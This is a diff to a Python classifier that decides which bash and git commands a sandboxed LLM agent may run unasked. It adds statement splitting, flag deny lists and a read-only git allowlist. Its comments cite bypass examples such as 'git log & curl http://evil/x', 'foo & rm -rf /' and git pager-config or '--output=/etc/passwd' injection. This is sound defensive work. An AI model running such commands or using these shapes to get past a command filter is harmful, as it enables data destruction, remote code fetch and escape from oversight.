@@ -352,7 +352,13 @@ def _split_compound_command(command: str) -> list[str]:
                 quote_state = ch
                 i += 1
                 continue
-            if ch in (";", "\n"):
+            if ch in (";", "\n", "\r"):
+                # `\r` treated as `\n`: some pipelines (Windows-authored payloads,
+                # copy-pasted heredocs) carry CR terminators. Bash on Unix ignores
+                # bare `\r` between tokens, but the classifier fails-closed here —
+                # splitting on `\r` prevents an obfuscation vector where a
+                # payload uses CR to hide a second statement from a `\n`-only
+                # splitter (coherence refute cpp#103 2026-08-06).
                 segments.append(command[seg_start:i].strip())
                 i += 1
                 seg_start = i
@@ -360,6 +366,25 @@ def _split_compound_command(command: str) -> list[str]:
             if ch == "&" and i + 1 < n and command[i + 1] == "&":
                 segments.append(command[seg_start:i].strip())
                 i += 2
+                seg_start = i
+                continue
+            if ch == "&":
+                # Single `&` = background operator (statement separator). Bash
+                # runs the LHS in the background and continues with the next
+                # statement — same semantic as `;` for classifier purposes.
+                # BUT: `&` also appears in fd-redirect syntax `2>&1` / `>&2`.
+                # Preceded by `>` → part of a redirect, NOT a separator.
+                # Preceded by `<` → part of process-substitution `<(...)` /
+                # `<&N` — also not a separator. Fix cpp#103 (coherence refute
+                # 2026-08-06): previously single `&` fell through to `i += 1`
+                # and `foo & rm -rf /` never split, so the rm sub scattered
+                # outside the deny check.
+                prev = command[i - 1] if i > 0 else ""
+                if prev in (">", "<"):
+                    i += 1
+                    continue
+                segments.append(command[seg_start:i].strip())
+                i += 1
                 seg_start = i
                 continue
             if ch == "|":
@@ -491,6 +516,13 @@ def is_safe_bash_command(command: str) -> bool:
     # boundary here, not the generic guards. Fails CLOSED if attestation
     # absent or shape drifts (see `is_ce_work_preamble_when_contained` doc).
     if is_ce_work_preamble_when_contained(command):
+        return True
+
+    # cpp#103: read-only git compounds under containment attestation. Must
+    # match BEFORE the metachar guard — `&&`/`|`/`2>/dev/null` are legitimate
+    # glue in ce-work branch-check compounds (SKILL.md §Setup Environment).
+    # Fail-closed on any unrecognized sub-command shape.
+    if is_git_readonly_compound_when_contained(command):
         return True
 
     if contains_unquoted_metacharacter(command):
@@ -668,6 +700,25 @@ _FORCE_FLAG_RE = re.compile(r"--force\b|-\w*f\b")
 _MAIN_MASTER_RE = re.compile(r"\b(main|master)\b")
 _BRANCH_D_RE = re.compile(r"-\w*D\b")
 
+# Global git-flag deny list (applies to ALL git commands, contained or not).
+# These flags turn git into an arbitrary-exec / arbitrary-write channel via
+# config injection (`-c core.pager='sh -c ...'`), cwd escape (`-C /etc`),
+# output redirection (`--output=/etc/passwd`), or ref-transport hijack
+# (`--upload-pack=<attacker-cmd>`). Coherence flagged these as exec-per-flag
+# leaks in cpp#103 refinement — closing them keeps `is_safe_git_command` an
+# honest read-only whitelist. See test_tier1_git_readonly_compound for the
+# attacker corpus these guard.
+_GIT_DENIED_GLOBAL_FLAG_RE = re.compile(
+    r"(^|\s)-c\s+\S+="              # `git -c KEY=VAL` config injection (pager attack)
+    r"|(^|\s)--config-env(\s|=)"    # env-var config injection
+    r"|(^|\s)-C\s+\S+"              # cwd escape
+    r"|(^|\s)--exec-path(\s|=)"     # git-core dir override (exec surface)
+    r"|(^|\s)--output(\s|=)"        # `git diff --output=/etc/passwd`
+    r"|(^|\s)-o\s+/"                # short form output (absolute path)
+    r"|(^|\s)--upload-pack(\s|=)"   # arbitrary transport exec (fetch/pull)
+    r"|(^|\s)--receive-pack(\s|=)"  # arbitrary transport exec (push)
+)
+
 
 def is_safe_git_command(sub: str) -> bool:
     match = _GIT_CMD_RE.match(sub)
@@ -680,9 +731,311 @@ def is_safe_git_command(sub: str) -> bool:
 
     if _FORCE_FLAG_RE.search(sub):
         return False
+    if _GIT_DENIED_GLOBAL_FLAG_RE.search(sub):
+        return False
     if git_sub == "push" and _MAIN_MASTER_RE.search(sub):
         return False
-    if git_sub == "branch" and _BRANCH_D_RE.search(sub):
+    if git_sub == "branch":
+        # cpp#103 minor resserrement: extend mutant-flag deny beyond `-D` to
+        # cover `-d`/`-m`/`-M`/`--delete`/`--move`. `--force`/`-f` already
+        # caught by `_FORCE_FLAG_RE`. Token-based check avoids the
+        # `-\w*[dDmM]` false-positive on `--diff-filter=D` and similar.
+        tokens = sub.split()
+        for tok in tokens:
+            if tok in _GIT_BRANCH_MUTANT_TOKENS:
+                return False
+
+    return True
+
+
+# ── Read-only git compound predicate (cpp#103, Exec-si-contenu widen) ────────
+#
+# The compound-engineering `ce-work` skill (SKILL.md §Setup Environment lines
+# 122-129) prescribes a branch-check compound the pilot LLM reformulates as
+# something like:
+#
+#   git branch --show-current && echo "---" && \
+#     git symbolic-ref refs/remotes/origin/HEAD 2>/dev/null | \
+#     sed 's@^refs/remotes/origin/@@' && \
+#     echo "---" && git status --short | head -30
+#
+# The pilot Turn-5 policy:deny [bash-git-readonly] baseline (session
+# `7d4f2321-5e11-4c74-807f-fa1dabb9458a`, 2026-08-06) shows this pattern kills
+# every contained dispatch — legitimate ce-work behavior, `contains_unquoted_
+# metacharacter` fires on `&&` / `|` / `2>/dev/null` before any per-sub
+# classification.
+#
+# Under `MIKA_PILOT_CONTAINED=1` this compound is bounded — fs writes land in
+# bwrap tmpfs / worktree, net through egress allowlist, kernel unshares
+# isolate the process. We match the compound-shape BEFORE the metachar guard
+# fires (same slot as `is_ce_work_preamble_when_contained`), gated on the
+# attestation. Fail-CLOSED on unknown shapes — every sub-command must match
+# one of the whitelisted forms below.
+#
+# Scope: read-only git primitives + benign pipe tools (echo literal, sed pure
+# substitution, head/tail/wc, cat, mktemp). Coherence-refined shapes closed
+# the exec-per-flag leaks: git flag deny (see `_GIT_DENIED_GLOBAL_FLAG_RE`),
+# sed pure `s///[gp]` only (deny `e`/`w`/`W`/`r`), echo no `$(...)`/backtick,
+# mktemp no `--tmpdir=<path>`.
+#
+# Precondition (verified 2026-08-06 pre-merge):
+#   (a) `MIKA_PILOT_CONTAINED=1` inforgeable — sole setter is
+#       `mika/skills/bundled/_shared/dispatch-lib.sh:287 --setenv` inside the
+#       Phase 2b bwrap invocation, AFTER `--clearenv`. Sole reader is
+#       `_is_pilot_contained()` above. No mika/cpp code sets it elsewhere.
+#   (b) Structural bwrap coupling — `MIKA_PILOT_SANDBOX=0` bypass returns
+#       from `_run_pilot_sandboxed` direct-exec (no bwrap → no --setenv →
+#       attestation absent → this predicate fails closed → strict deny).
+#       No mika code sets `MIKA_PILOT_SANDBOX=0` — bypass requires explicit
+#       operator env intervention.
+
+# Strict read-only subset of SAFE_GIT_SUBCOMMANDS. Excludes any subcommand
+# with ref/index/working-tree mutation semantics (commit/push/checkout/
+# worktree/add/stash/tag/merge/rebase/cherry-pick/fetch/pull/remote/branch-mut).
+# `branch` is allowed in this set for read-mode (`--show-current`, `--list`,
+# etc.) — the compound predicate additionally denies `branch -d/-D/-m/-M/-f`
+# via `_BRANCH_D_RE` + a `-m/-M` guard applied below.
+SAFE_GIT_READONLY_SUBCOMMANDS: frozenset[str] = frozenset({
+    "status", "log", "diff", "show", "branch", "rev-parse",
+    "symbolic-ref", "ls-files", "describe", "shortlog", "blame",
+    "merge-base",
+})
+
+_GIT_BRANCH_MUTANT_FLAG_RE = re.compile(r"-\w*[dDmM]\b")
+
+# Sed: allow ONLY pure substitution `s<SEP>PATTERN<SEP>REPLACE<SEP>[gp]*`.
+# Deny `e` flag (exec via replacement), `w`/`W` (write to file), `r` (read
+# arbitrary file), any command other than `s` (`d`/`y`/`q`/`n`/`a`/`i`/`c`/
+# `!`), `-e` (multi-script), `-f` (script file), `-i` (in-place).
+# SEP is one of `/@#|:` — the common alternatives; separator uniqueness
+# inside PATTERN/REPLACE is guaranteed by `[^SEP\\]*` character class per SEP.
+_SAFE_SED_SUB_RES = [
+    re.compile(r"^\s*sed\s+'s/(?:[^/\\]|\\.)*/(?:[^/\\]|\\.)*/[gp]*'\s*(?:\S+\s*)*$"),
+    re.compile(r"^\s*sed\s+'s@(?:[^@\\]|\\.)*@(?:[^@\\]|\\.)*@[gp]*'\s*(?:\S+\s*)*$"),
+    re.compile(r"^\s*sed\s+'s#(?:[^#\\]|\\.)*#(?:[^#\\]|\\.)*#[gp]*'\s*(?:\S+\s*)*$"),
+    re.compile(r"^\s*sed\s+'s\|(?:[^|\\]|\\.)*\|(?:[^|\\]|\\.)*\|[gp]*'\s*(?:\S+\s*)*$"),
+    re.compile(r"^\s*sed\s+'s:(?:[^:\\]|\\.)*:(?:[^:\\]|\\.)*:[gp]*'\s*(?:\S+\s*)*$"),
+]
+
+# Echo literal: quoted string containing NO `$` (blocks `$(...)` and `$var`),
+# NO backtick (blocks `` `cmd` `` substitution), NO unescaped inner `"`.
+_SAFE_ECHO_QUOTED_RE = re.compile(r'^\s*echo\s+"(?:[^"$`\\]|\\.)*"\s*$')
+# Unquoted echo of pure literal (very narrow charset)
+_SAFE_ECHO_LITERAL_RE = re.compile(r"^\s*echo\s+[A-Za-z0-9_.,:/=+-]+\s*$")
+
+# Bounded pipe tools: head/tail with numeric arg only, wc with flag-only,
+# cat with single filename arg, mktemp with only -d (no --tmpdir=<path>).
+# File args restricted to same charset as cat — prevents `head -30 >stolen`
+# where `>stolen` was accepted as a file arg by loose `\S+` (coherence
+# refute 2026-08-06 mineur).
+_SAFE_HEAD_TAIL_RE = re.compile(
+    r"^\s*(?:head|tail)(?:\s+-[cn]\s*\d+|\s+-\d+)?(?:\s+[A-Za-z0-9_./-]+)?\s*$"
+)
+_SAFE_WC_RE = re.compile(r"^\s*wc(?:\s+-[lcwLm]+)?(?:\s+[A-Za-z0-9_./-]+)?\s*$")
+_SAFE_CAT_RE = re.compile(r"^\s*cat\s+[A-Za-z0-9_./-]+\s*$")
+_SAFE_MKTEMP_RE = re.compile(r"^\s*mktemp(?:\s+-d)?\s*$")
+
+
+def _is_safe_sed_pure_substitution(sub: str) -> bool:
+    """True iff sub is `sed 's<SEP>PATTERN<SEP>REPLACE<SEP>[gp]*' [FILE]`.
+
+    Deny-list intentionally strict: no `e` flag (exec), no `w`/`W`/`r`
+    (file I/O), no non-`s` command, no `-e`/`-f`/`-i` flags. Any deviation
+    from the exact substitution shape → False.
+    """
+    return any(rgx.match(sub) for rgx in _SAFE_SED_SUB_RES)
+
+
+def _is_safe_echo_literal(sub: str) -> bool:
+    """True iff sub is `echo "quoted-literal-no-metachars"` or bare literal."""
+    return bool(_SAFE_ECHO_QUOTED_RE.match(sub) or _SAFE_ECHO_LITERAL_RE.match(sub))
+
+
+def _is_safe_pipe_tool(sub: str) -> bool:
+    """True iff sub is head/tail/wc/cat/mktemp in a bounded read-only shape."""
+    return bool(
+        _SAFE_HEAD_TAIL_RE.match(sub)
+        or _SAFE_WC_RE.match(sub)
+        or _SAFE_CAT_RE.match(sub)
+        or _SAFE_MKTEMP_RE.match(sub)
+    )
+
+
+# Token-based flag deny for the readonly compound predicate. Avoids the
+# pre-existing `_FORCE_FLAG_RE` false positive that matches `-ref` inside
+# the compound word `symbolic-ref` (bug in `-\w*f\b`). Tokenizes on
+# whitespace and matches WHOLE tokens against the deny set.
+_GIT_READONLY_DENIED_TOKENS = frozenset({
+    "--force",
+    "-f",
+    "-c",           # `git -c KEY=VAL` config injection (pager attack)
+    "-C",           # cwd escape
+    "-o",           # short output
+    "--output",
+    "--config-env",
+    "--exec-path",
+    "--upload-pack",
+    "--receive-pack",
+})
+
+# Prefix-match deny (for `KEY=VAL` suffixed flags: `--output=/x`, `-c KEY=X`,
+# etc.). Checked separately since exact-token match doesn't cover `<flag>=X`.
+_GIT_READONLY_DENIED_PREFIXES = (
+    "--output=",
+    "--config-env=",
+    "--exec-path=",
+    "--upload-pack=",
+    "--receive-pack=",
+    "-c",          # will match `-c` bare AND `-cKEY=X` (rare shape)
+)
+
+# Branch mutant flags: `-d`, `-D`, `-m`, `-M`, `-f`, `--delete`, `--move`,
+# `--force`. Token-based (avoids the `-\w*[dDmM]` false positive on things
+# like `-diff-filter=D`).
+_GIT_BRANCH_MUTANT_TOKENS = frozenset({
+    "-d", "-D", "-m", "-M", "-f",
+    "--delete", "--move", "--force",
+})
+
+
+def _is_safe_git_readonly_sub(sub: str) -> bool:
+    """True iff sub is a strict read-only git command (compound-safe subset).
+
+    Stricter than `is_safe_git_command`:
+      * SAFE_GIT_READONLY_SUBCOMMANDS only (no commit/push/checkout/etc.)
+      * Global git-flag deny by TOKEN match (config-injection, cwd escape,
+        output write, transport-exec) — avoids `_FORCE_FLAG_RE`'s false
+        positive on compound words like `symbolic-ref`.
+      * `branch -d/-D/-m/-M/-f/--delete/--move/--force` denied (mutants).
+      * No `>`, `>>`, `<`, `<(`, `>(` shell redirects (except upstream-
+        stripped `2>/dev/null`).
+    """
+    match = _GIT_CMD_RE.match(sub)
+    if not match:
+        return False
+    git_sub = match.group(1)
+    if git_sub not in SAFE_GIT_READONLY_SUBCOMMANDS:
+        return False
+
+    # Redirect chars deny — any `>`/`>>`/`<`/`<(`/`>(` remaining after the
+    # caller stripped `[0-9]*>/dev/null` denies. Previously excluded
+    # fd-numeric prefix via `(?<![0-9])>` — but that let `1>/tmp/evil` and
+    # `2>/tmp/x` (non-devnull stderr redirect) through (coherence mineur).
+    # Now: any `>`/`<` char in the sub (post-devnull-strip) → deny.
+    if ">" in sub or "<" in sub:
+        return False
+
+    # Tokenize on whitespace; check each token against deny sets.
+    tokens = sub.split()
+    for tok in tokens:
+        if tok in _GIT_READONLY_DENIED_TOKENS:
+            return False
+        for prefix in _GIT_READONLY_DENIED_PREFIXES:
+            # `-c` alone requires the NEXT token to be KEY=VAL to be an injection;
+            # `-C` alone requires the NEXT token to be a path (also denied).
+            # We deny both bare -c/-C and any --output=/--config-env=/etc. prefix.
+            if tok.startswith(prefix) and prefix in ("--output=", "--config-env=",
+                                                       "--exec-path=", "--upload-pack=",
+                                                       "--receive-pack="):
+                return False
+        # Branch subcommand mutant flag check
+        if git_sub == "branch" and tok in _GIT_BRANCH_MUTANT_TOKENS:
+            return False
+
+    return True
+
+
+# Compound split respecting `&&`, `||`, `;`, `|`, `&` (background), and
+# `\n`/`\r` (statement separators — bash treats each line as an independent
+# command). All are legitimate separators bash executes each side of. Missing
+# `&` and newline (coherence-flagged 2026-08-06 refute) allowed a bypass:
+# `git log & curl http://evil/x` tokenized across `&` in `sub.split()` and
+# the `curl` sub scattered outside the deny check → auto-approved. Fix
+# closes the gap so each sub re-validates independently.
+#
+# `[0-9]*>/dev/null` (fd-numeric stderr suppression) is stripped from each
+# sub BEFORE predicate matching. Strip is anchored to end-of-token to prevent
+# suffix escape (`2>/dev/null/../etc/x` no longer strips at the `null` bound-
+# ary). Any other `>`/`>>`/`<` remaining after strip → sub fails closed.
+_STDERR_DEVNULL_RE = re.compile(r"\s+[0-9]*>/dev/null(?=\s|$)")
+
+
+def _split_git_readonly_compound(command: str) -> list[str]:
+    """Split on `&&`/`||`/`;`/`|`/`&`/newline and strip `[0-9]*>/dev/null`.
+
+    Every bash statement separator handled — the compound whitelist must
+    validate EACH resulting sub, not the glue itself. `&` (background) and
+    `\\n`/`\\r` (line breaks) previously slipped through, allowing
+    `git log & curl evil` to auto-approve (coherence refute 2026-08-06).
+    """
+    # Newlines and background-`&` are statement terminators; treat as `;`.
+    parts = re.split(r"\s*(?:&&|\|\||;|\||&|\n|\r)\s*", command)
+    return [_STDERR_DEVNULL_RE.sub("", p).strip() for p in parts if p.strip()]
+
+
+def is_git_readonly_compound_when_contained(command: str) -> bool:
+    """Match read-only git compounds bounded by containment (cpp#103).
+
+    Returns True IFF:
+      1. `MIKA_PILOT_CONTAINED=1` — attestation gate (structurally inforgeable
+         per (a)/(b) audit above)
+      2. `contains_unquoted_metacharacter(command)` is False — blocks
+         `$(...)`/backtick in double-quoted arg strings (cpp#41 semantics).
+      3. `is_tier3_dangerous(command)` is False — defense-in-depth call at
+         predicate scope so tier3 patterns (find -exec, sudo, curl, rm -rf,
+         `>` redirect, etc.) still fail closed even when a sub matches the
+         whitelist. Previous code path returned True BEFORE the standard
+         `is_tier3_dangerous` call in `is_safe_bash_command` — coherence
+         refute 2026-08-06 closed this gap.
+      4. Every sub-command (split on `&&`/`||`/`;`/`|`/`&`/newline, stripping
+         `[0-9]*>/dev/null`) matches ONE of:
+           * `git <SAFE_GIT_READONLY_SUBCOMMAND> [flags]` per
+             `_is_safe_git_readonly_sub` (flag deny-list applied)
+           * `sed 's<SEP>PATTERN<SEP>REPLACE<SEP>[gp]*'` pure substitution
+           * `echo "literal"` or bare literal (no `$`/backtick)
+           * `head|tail|wc|cat|mktemp` in bounded shape
+      5. Any unrecognized sub fails closed.
+
+    Wired into `is_safe_bash_command` BEFORE the metachar guard so that
+    `&&`, `|`, and `2>/dev/null` in these legitimate compounds don't trip
+    the standard-deny path. Guards 2 and 3 are called explicitly here to
+    preserve their semantic (they run downstream in `is_safe_bash_command`
+    but this predicate's `return True` short-circuits them).
+    """
+    if not _is_pilot_contained():
+        return False
+    if not command.strip():
+        return False
+
+    # Metachar substitution guard — deny even if it appears inside double
+    # quotes (cpp#41 semantics: bash expands `$(...)` and backticks in `"..."`).
+    # We bypass `_split_compound_command`'s per-op check for the whitelisted
+    # `&&`/`||`/`;`/`|` glue, but we do NOT permit hidden command substitution
+    # in argument strings. `contains_unquoted_metacharacter` correctly flags
+    # `$(`/backtick/`$'` in both unquoted and double-quoted regions.
+    if contains_unquoted_metacharacter(command):
+        return False
+
+    # Defense-in-depth: `is_tier3_dangerous` is normally called downstream in
+    # `is_safe_bash_command` — but this predicate short-circuits with `return
+    # True` BEFORE the tier3 call. Call it explicitly here so tier3 patterns
+    # (find -exec, sudo, curl, rm -rf, `>` redirect, etc.) still fail closed
+    # even if a sub happens to match the whitelist (coherence refute 2026-08-06).
+    if is_tier3_dangerous(command):
+        return False
+
+    subs = _split_git_readonly_compound(command)
+    if not subs:
+        return False
+
+    for sub in subs:
+        if (
+            _is_safe_git_readonly_sub(sub)
+            or _is_safe_sed_pure_substitution(sub)
+            or _is_safe_echo_literal(sub)
+            or _is_safe_pipe_tool(sub)
+        ):
+            continue
         return False
 
     return True
